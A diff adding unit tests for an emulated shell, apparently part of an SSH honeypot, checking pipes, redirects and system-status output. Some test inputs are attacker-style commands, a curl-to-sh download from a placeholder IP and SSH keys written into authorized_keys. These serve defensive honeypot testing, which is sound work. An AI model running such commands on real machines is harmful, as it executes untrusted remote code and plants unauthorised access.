@@ -58,3 +58,34 @@ def test_chained_commands_and_downloads_update_state():
     assert run(fs, "ls") == "x.sh\n"
     run(fs, "rm x.sh")
     assert run(fs, "ls") == ""
+
+
+def test_pipes_and_redirects():
+    fs = PseudoFilesystem("s", username="root")
+    assert run(fs, "ps aux | grep sshd | wc -l").strip() == "2"
+    assert run(fs, "ps aux | grep -v root | head -n 1").startswith("USER")
+    assert run(fs, "curl http://198.51.100.7/x.sh | sh") == ""  # piped script never runs anywhere
+    # a dropped SSH key is readable afterwards, appends accumulate, /dev/null swallows output
+    run(fs, 'echo "ssh-rsa AAAA key1" > ~/.ssh/authorized_keys')
+    run(fs, 'echo "ssh-rsa BBBB key2" >> ~/.ssh/authorized_keys')
+    assert run(fs, "cat ~/.ssh/authorized_keys") == "ssh-rsa AAAA key1\nssh-rsa BBBB key2\n"
+    assert run(fs, "cat /nonexistent 2>/dev/null > /dev/null") == ""
+    run(fs, "cd /tmp && echo hi > a.txt")
+    assert run(fs, "ls") == "a.txt\n" and run(fs, "cat a.txt") == "hi\n"
+    run(fs, "rm a.txt")
+    assert run(fs, "ls") == ""
+
+
+def test_status_commands_are_consistent():
+    fs = PseudoFilesystem("s", username="admin")
+    ps = run(fs, "ps aux")
+    assert "PID" in ps and "mysqld" in ps and "admin" in ps
+    assert run(fs, "ps").splitlines()[1].endswith("bash")
+    assert "ps -ef" not in run(fs, "ps -ef | grep -c bash")  # filter ran, no raw dump
+    listening = run(fs, "netstat -tulpn")
+    assert ":22 " in listening and "sshd" in listening and "3306" in listening
+    assert "10.0.0.55" in run(fs, "ifconfig") and "10.0.0.55" in run(fs, "ip a")
+    assert "/dev/nvme0n1p1" in run(fs, "df -h")
+    assert "load average" in run(fs, "uptime")
+    assert run(fs, "crontab -l") == "no crontab for admin\n"
+    assert run(fs, "pstree") == "bash: pstree: command not found\n"  # no substring matching on 'ps'
